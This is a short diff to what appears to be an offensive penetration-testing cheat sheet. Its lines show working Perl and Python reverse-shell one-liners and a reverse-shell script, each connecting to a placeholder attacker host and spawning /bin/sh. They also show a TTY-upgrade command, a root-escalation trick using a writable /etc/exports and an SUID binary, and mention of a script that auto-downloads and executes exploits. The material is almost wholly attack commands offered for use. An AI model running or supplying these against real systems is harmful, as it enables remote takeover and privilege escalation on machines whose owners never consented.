@@ -15,9 +15,6 @@ Getting a reverse shell
     *perl -e 'use Socket;$i="<attacker_ip>";$p=<port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'*
     Python
     *python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'*
-Post exploitation
-    Get a TTY shell after a reverse shell connection
-    *$ python -c 'import pty;pty.spawn("/bin/bash")'*
     Reverse shell with python script:
     *#!/usr/bin/python
 import socket,subprocess,os
@@ -28,7 +25,9 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])*
 
-
+Post exploitation
+    Get a TTY shell after a reverse shell connection
+    *$ python -c 'import pty;pty.spawn("/bin/bash")'*
 
 Escaping limited interpreters
     Some commands to overcome limited shells:
@@ -77,7 +76,7 @@ Linux elevation of privileges
     What services are running as root?:
     *$ ps aux | grep root*
 
-    If /etc/exports if writable, you can add an NFS entry to a root directory, put a binary with SUID bit on, and get root
+    If */etc/exports* if writable, you can add an NFS entry to a root directory, put a binary with SUID bit on, and get root
 
 Scripts to run
     The following script runs exploit suggester and automatically downloads and executes suggested exploits:
